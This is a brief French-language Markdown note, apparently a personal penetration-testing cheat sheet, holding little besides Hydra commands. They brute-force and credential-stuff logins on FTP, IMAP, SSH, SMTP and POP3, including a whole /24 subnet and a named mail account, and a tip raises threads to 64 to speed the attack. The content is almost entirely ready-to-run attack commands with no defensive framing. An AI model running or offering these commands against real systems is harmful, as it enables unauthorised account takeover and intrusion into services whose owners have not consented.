---
public: true # set to true to make the article publishable
---
```
hydra -l user -P passlist.txt ftp://192.168.0.1
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN

# credential stuffing
hydra -C user_pass.list ssh://$TARGET_IP
hydra -l admin -p password ftp://[192.168.0.0/24]/
hydra -L logins.txt -P pws.txt -M targets.txt ssh

# bruteforce mail service password for known user
hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP smtp -t 64  
hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP pop3 -t 64 
hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP imap -t 64 

```
Plus d'exemple d'utilisation de l'outil : [[Hydra]]
## Augmenter la rapidité de l'attaque

On peut utiliser `-t 64` pour augmenter le nombre de threads

```
hydra -l sam -P mut_password.list ftp://$TARGET_IP -t 64 
```

[[Hydra]]